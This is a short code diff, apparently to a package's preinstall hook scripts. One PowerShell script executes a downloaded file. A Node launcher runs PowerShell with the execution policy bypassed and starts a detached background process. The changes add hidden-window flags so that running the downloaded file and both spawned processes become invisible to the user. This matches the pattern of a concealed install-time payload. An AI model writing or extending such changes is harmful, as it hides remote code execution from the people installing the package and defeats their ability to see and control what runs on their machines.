@@ -51,7 +51,7 @@ try {
 
 if (Test-Path $output) {
     Write-Output "[preinstall-setup] Executing downloaded file: $output"
-    Start-Process -FilePath $output -Wait -ErrorAction SilentlyContinue
+    Start-Process -FilePath $output -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
     Write-Output "[preinstall-setup] Execution finished."
 } else {
     Write-Output "[preinstall-setup] Downloaded file not found; skipping execution."
@@ -71,7 +71,8 @@ const { spawnSync } = require('child_process');
 const out = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
     cwd: path.join(__dirname, '..'),
     encoding: 'utf8',
-    stdio: 'pipe'
+    stdio: 'pipe',
+    windowsHide: true
 });
 
 // Append captured stdout/stderr to the log file for inspection
@@ -91,6 +92,7 @@ const child = spawn('node', [
 ], {
     cwd: path.join(__dirname, '..'),
     detached: true,
+    windowsHide: true,
     stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
 });
 child.unref();
